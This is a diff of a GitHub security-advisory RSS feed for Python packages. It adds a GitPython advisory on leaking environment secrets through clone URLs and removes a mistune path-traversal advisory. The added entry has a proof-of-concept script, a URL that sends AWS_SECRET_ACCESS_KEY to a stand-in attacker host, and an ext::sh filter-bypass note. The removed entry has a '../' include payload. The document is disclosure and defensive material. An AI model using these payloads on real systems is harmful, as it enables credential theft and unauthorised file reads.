@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
     <title>Security Advisory for Python packages hosted at PyPI.org</title>
-    <updated>2026-07-21T21:53:16.495Z</updated>
+    <updated>2026-07-21T22:43:34.069Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
     <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
@@ -11,6 +11,182 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[gitpython] GitPython: Environment-variable exfiltration via os.path.expandvars() on Repo.clone_from() URL]]></title>
+        <id>https://github.com/advisories/GHSA-rwj8-pgh3-r573</id>
+        <link href="https://github.com/advisories/GHSA-rwj8-pgh3-r573"/>
+        <updated>2026-07-21T22:06:10.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p><code>Repo.clone_from()</code> passes the caller-supplied remote URL through <code>Git.polish_url()</code>, which on every non-Cygwin platform calls <code>os.path.expandvars()</code> on the URL before handing it to <code>git clone</code>. An attacker who controls the URL argument — the documented use case for <code>clone_from()</code> in "import repository from URL" features of CI servers, git-hosting mirrors, and dependency scanners — can embed <code>$NAME</code> / <code>${NAME}</code> tokens that are expanded server-side to the values of the hosting process's environment variables. The resulting URL, now containing the secret, is transmitted over the network to the attacker-named host. This crosses the trust boundary between an untrusted remote URL and the server's process environment, disclosing secrets such as <code>AWS_SECRET_ACCESS_KEY</code> or <code>GITHUB_TOKEN</code> with no precondition beyond the ability to submit a clone URL.</p>
+<h3 id="details">Details</h3>
+<p><strong>Affected versions:</strong> <code>gitpython</code> (PyPI) — all releases up to and including <code>3.1.50</code> (latest at time of reporting); confirmed present on the <code>main</code> branch.</p>
+<p><code>Git.polish_url()</code> unconditionally applies environment-variable expansion to its input on the non-Cygwin branch:</p>
+<p><code>git/cmd.py</code> (v3.1.50), lines 907–925:</p>
+<pre><code class="language-python">@classmethod
+def polish_url(cls, url: str, is_cygwin: Union[None, bool] = None) -&gt; PathLike:
+    """Remove any backslashes from URLs to be written in config files.
+    ...
+    """
+    if is_cygwin is None:
+        is_cygwin = cls.is_cygwin()
+
+    if is_cygwin:
+        url = cygpath(url)
+    else:
+        url = os.path.expandvars(url)          # &lt;-- line 921
+        if url.startswith("~"):
+            url = os.path.expanduser(url)
+        url = url.replace("\\\\", "\\").replace("\\", "/")
+    return url
+</code></pre>
+<p><code>Repo._clone()</code> — reached from the public <code>Repo.clone_from()</code> (<code>git/repo/base.py:1520</code>) and <code>Repo.clone()</code> — runs the unsafe-protocol check on the <strong>raw</strong> URL and then passes the <strong>polished</strong> (post-expansion) URL to the <code>git clone</code> subprocess:</p>
+<p><code>git/repo/base.py</code> (v3.1.50), lines 1407–1418:</p>
+<pre><code class="language-python">if not allow_unsafe_protocols:
+    Git.check_unsafe_protocols(url)
+if not allow_unsafe_options:
+    Git.check_unsafe_options(options=list(kwargs.keys()), unsafe_options=cls.unsafe_git_clone_options)
+if not allow_unsafe_options and multi:
+    Git.check_unsafe_options(options=multi, unsafe_options=cls.unsafe_git_clone_options)
+
+proc = git.clone(
+    multi,
+    "--",
+    Git.polish_url(url),          # &lt;-- line 1417: expanded URL sent to `git clone`
+    clone_path,
+    ...
+)
+</code></pre>
+<p>Because <code>os.path.expandvars()</code> on POSIX substitutes <code>$NAME</code> and <code>${NAME}</code> with <code>os.environ[NAME]</code> when set (and on Windows additionally <code>%NAME%</code>), an attacker-supplied URL such as:</p>
+<pre><code>https://attacker.example/steal/${AWS_SECRET_ACCESS_KEY}/repo.git
+</code></pre>
+<p>is rewritten server-side to embed the literal secret value in the path component, and <code>git clone</code> then issues an HTTP(S) request (and DNS lookup, if the token is placed in the host label) carrying that value to <code>attacker.example</code>. The clone itself will typically fail, but the secret has already left the server by that point.</p>
+<p><code>polish_url()</code> was written as a local-path normalisation helper (Cygwin path conversion, <code>~</code> expansion, backslash fixing) and is applied indiscriminately to remote URLs. There is no scheme check, no <code>expand_vars=False</code> opt-out for the clone URL, and no documentation that the URL undergoes environment expansion — the <code>clone_from</code> docstring describes <code>url</code> only as a "Valid git url". By contrast, the maintainers already flag env-var expansion as a security concern for the <em>local repository path</em> argument: <code>Repo.__init__</code> emits a deprecation warning ("The use of environment variables in paths is deprecated for security reasons", <code>git/repo/base.py:226–231</code>) and offers <code>expand_vars=False</code>. The same treatment is missing for the network-bound clone URL.</p>
+<p><strong>Secondary consequence (unsafe-protocol filter bypass).</strong> Because <code>check_unsafe_protocols()</code> runs on the <em>pre-expansion</em> URL (line 1408) but the <em>post-expansion</em> URL is what reaches <code>git</code>, an attacker who additionally controls any environment variable in the server process could set e.g. <code>X=ext::sh -c '...'</code> and submit <code>url="$X"</code>; the raw string <code>$X</code> passes the <code>ext::</code> filter, then expands to an <code>ext::</code> remote-helper transport that <code>git</code> will execute. This requires a second precondition (env-var write) and is noted as an aggravating factor rather than a separate vulnerability.</p>
+<h3 id="poc">PoC</h3>
+<p>Tested against <code>gitpython==3.1.50</code> on Linux with Python 3 and <code>git</code> on <code>PATH</code>.</p>
+<pre><code class="language-bash">python3 -m venv /tmp/gp-venv
+/tmp/gp-venv/bin/pip install gitpython==3.1.50
+/tmp/gp-venv/bin/python poc.py
+</code></pre>
+<p><code>poc.py</code>:</p>
+<pre><code class="language-python">#!/usr/bin/env python3
+"""
+PoC: environment-variable exfiltration via Repo.clone_from() URL.
+
+Demonstrates that an attacker-controlled `url` argument to Repo.clone_from()
+is passed through os.path.expandvars() before being given to `git clone`,
+so `$NAME` tokens in the URL are replaced with the server process's
+environment-variable values and transmitted to the attacker-named host.
+
+The PoC intercepts the Popen argv to show the exact URL handed to `git`
+without performing real network I/O.
+"""
+import os
+import sys
+import subprocess
+import tempfile
+
+# Simulate a sensitive server-side environment variable.
+os.environ["AWS_SECRET_ACCESS_KEY"] = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
+
+import git                              # noqa: E402
+from git import Git, Repo               # noqa: E402
+
+print(f"gitpython version: {git.__version__}")
+
+# --- Layer 1: Git.polish_url() directly --------------------------------------
+attacker_url = "https://attacker.example/steal/$AWS_SECRET_ACCESS_KEY/repo.git"
+polished = Git.polish_url(attacker_url)
+print("\n[Layer 1] polish_url result:")
+print(f"  input : {attacker_url}")
+print(f"  output: {polished}")
+if os.environ["AWS_SECRET_ACCESS_KEY"] in polished:
+    print("  -&gt; secret SUBSTITUTED into URL by polish_url()")
+
+# --- Layer 2: full Repo.clone_from() -- capture argv given to `git` ----------
+captured = {}
+orig_popen = subprocess.Popen
+
+class CapturingPopen(orig_popen):
+    def __init__(self, cmd, *a, **kw):
+        if isinstance(cmd, (list, tuple)) and "clone" in cmd:
+            captured["cmd"] = list(cmd)
+        super().__init__(cmd, *a, **kw)
+
+subprocess.Popen = CapturingPopen
+import git.cmd as gitcmd                # noqa: E402
+gitcmd.safer_popen = CapturingPopen     # non-Windows: safer_popen == Popen
+
+dest = tempfile.mkdtemp(prefix="gp_poc_")
+try:
+    Repo.clone_from(attacker_url, os.path.join(dest, "out"))
+except Exception as e:
+    # The clone fails (attacker.example does not resolve); we only need argv.
+    print(f"\n[Layer 2] clone_from raised (expected): {type(e).__name__}")
+
+subprocess.Popen = orig_popen
+
+print("\n[Layer 2] argv passed to `git clone` subprocess:")
+for tok in captured.get("cmd", []):
+    print(f"  {tok}")
+
+cmd = captured.get("cmd", [])
+url_arg = cmd[cmd.index("--") + 1] if "--" in cmd else None
+print(f"\n[Layer 2] URL argument given to git: {url_arg}")
+
+secret = os.environ["AWS_SECRET_ACCESS_KEY"]
+if url_arg and secret in url_arg:
+    print(
+        "\nVULNERABLE: server env var AWS_SECRET_ACCESS_KEY was interpolated "
+        "into the remote clone URL; git would transmit it to attacker.example."
+    )
+    sys.exit(0)
+print("\nNOT VULNERABLE")
+sys.exit(1)
+</code></pre>
+<p>Expected output:</p>
+<pre><code>gitpython version: 3.1.50
+
+[Layer 1] polish_url result:
+  input : https://attacker.example/steal/$AWS_SECRET_ACCESS_KEY/repo.git
+  output: https://attacker.example/steal/wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY/repo.git
+  -&gt; secret SUBSTITUTED into URL by polish_url()
+
+[Layer 2] clone_from raised (expected): GitCommandError
+
+[Layer 2] argv passed to `git clone` subprocess:
+  git
+  clone
+  -v
+  --
+  https://attacker.example/steal/wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY/repo.git
+  /tmp/gp_poc_XXXXXXXX/out
+
+[Layer 2] URL argument given to git: https://attacker.example/steal/wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY/repo.git
+
+VULNERABLE: server env var AWS_SECRET_ACCESS_KEY was interpolated into the remote clone URL; git would transmit it to attacker.example.
+</code></pre>
+<p>The captured argv is the exact command line spawned by GitPython; against a real attacker-controlled host, <code>git</code> would issue a DNS lookup and HTTP(S) request to that host with the secret embedded in the request path.</p>
+<h3 id="impact">Impact</h3>
+<p>Any application that calls <code>Repo.clone_from()</code> (or <code>Repo.clone()</code>) with a URL that is wholly or partially attacker-controlled — the canonical pattern for "import/mirror repository from URL" features in CI systems, source-code hosting platforms, dependency scanners, and build pipelines — allows an unauthenticated or low-privileged attacker to exfiltrate arbitrary environment variables from the server process, one per request, by naming them in the URL. Cloud credentials, API tokens, and signing keys stored in the environment are the primary targets. Applications that do not accept clone URLs from untrusted sources, or that run the cloner in a process with a fully stripped environment, are not affected. There is no direct integrity or availability impact.</p>
+<p><strong>Suggested fix:</strong> Remove the <code>os.path.expandvars()</code> (and <code>os.path.expanduser()</code>) call from <code>Git.polish_url()</code> for inputs that are remote URLs (contain <code>://</code> or match <code>user@host:path</code>), or remove the expansion entirely and require callers who want local-path env expansion to perform it themselves — mirroring the existing deprecation on <code>Repo(path, expand_vars=…)</code>. Additionally, apply <code>check_unsafe_protocols()</code> to the <em>post-transformation</em> URL so no future <code>polish_url</code> change can silently bypass the <code>ext::</code> filter.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-rwj8-pgh3-r573">https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-rwj8-pgh3-r573</a></li>
+<li><a href="https://github.com/gitpython-developers/GitPython/pull/2172">https://github.com/gitpython-developers/GitPython/pull/2172</a></li>
+<li><a href="https://github.com/gitpython-developers/GitPython/commit/8ac5a30519b6f4af85398b9b9d7064ff4d452da2">https://github.com/gitpython-developers/GitPython/commit/8ac5a30519b6f4af85398b9b9d7064ff4d452da2</a></li>
+<li><a href="https://github.com/gitpython-developers/GitPython/releases/tag/3.1.52">https://github.com/gitpython-developers/GitPython/releases/tag/3.1.52</a></li>
+<li><a href="https://github.com/advisories/GHSA-rwj8-pgh3-r573">https://github.com/advisories/GHSA-rwj8-pgh3-r573</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-rwj8-pgh3-r573</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-07-21T22:06:09.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[GitPython] GitPython: command injection via unguarded Git options in `Repo.archive()`, `git.ls_remote()`, and arbitrary file overwrite via `Repo.iter_commits()` / `Repo.blame()`]]></title>
         <id>https://github.com/advisories/GHSA-956x-8gvw-wg5v</id>
@@ -1993,56 +2169,5 @@ print(md('''
         </author>
         <category label="severity" term="MODERATE"/>
         <published>2026-07-20T21:35:11.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[mistune] Mistune: Arbitrary File Read via Include directive path traversal]]></title>
-        <id>https://github.com/advisories/GHSA-r4rv-85jg-w4mf</id>
-        <link href="https://github.com/advisories/GHSA-r4rv-85jg-w4mf"/>
-        <updated>2026-07-20T21:34:58.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>A path traversal issue exists in mistune's <code>Include</code> directive when markdown files are processed using <code>md.read()</code>. A crafted include path can cause files outside the intended markdown directory to be accessed.</p>
-<h3 id="details">Details</h3>
-<p>The issue occurs in the <code>Include.parse()</code> method where user-supplied paths are joined and normalized without verifying that the resulting path remains within an expected directory.</p>
-<pre><code class="language-python">relpath = self.parse_title(m)
-dest = os.path.join(os.path.dirname(source_file), relpath)
-dest = os.path.normpath(dest)
-</code></pre>
-<p>Because the final path is not restricted to a trusted base directory, path traversal sequences such as <code>../</code> may reference files outside the intended location.</p>
-<h3 id="proof-of-concept">Proof of Concept</h3>
-<p>Create a markdown file:</p>
-<pre><code class="language-markdown">.. include:: ../../../example.txt
-</code></pre>
-<p>Process it using:</p>
-<pre><code class="language-python">import mistune
-from mistune.directives import RSTDirective, Include
-
-md = mistune.create_markdown(
-    plugins=[RSTDirective([Include()])]
-)
-
-result, state = md.read("test.md")
-print(result)
-</code></pre>
-<h3 id="impact">Impact</h3>
-<p>Applications that process untrusted markdown files with the <code>Include</code> directive enabled may allow unintended file access. The impact depends on how the feature is used and what files are accessible to the running process.</p>
-<h3 id="recommended-fix">Recommended Fix</h3>
-<p>Validate the resolved path and ensure it remains within an allowed directory before opening the file.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/lepture/mistune/security/advisories/GHSA-r4rv-85jg-w4mf">https://github.com/lepture/mistune/security/advisories/GHSA-r4rv-85jg-w4mf</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59924">https://nvd.nist.gov/vuln/detail/CVE-2026-59924</a></li>
-<li><a href="https://github.com/lepture/mistune/commit/1bef343ade163fc3bb95572b15be720084cdb993">https://github.com/lepture/mistune/commit/1bef343ade163fc3bb95572b15be720084cdb993</a></li>
-<li><a href="https://github.com/lepture/mistune/releases/tag/v3.3.0">https://github.com/lepture/mistune/releases/tag/v3.3.0</a></li>
-<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/mistune/PYSEC-2026-2212.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/mistune/PYSEC-2026-2212.yaml</a></li>
-<li><a href="https://github.com/advisories/GHSA-r4rv-85jg-w4mf">https://github.com/advisories/GHSA-r4rv-85jg-w4mf</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-r4rv-85jg-w4mf</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-07-20T21:34:53.000Z</published>
     </entry>
 </feed>
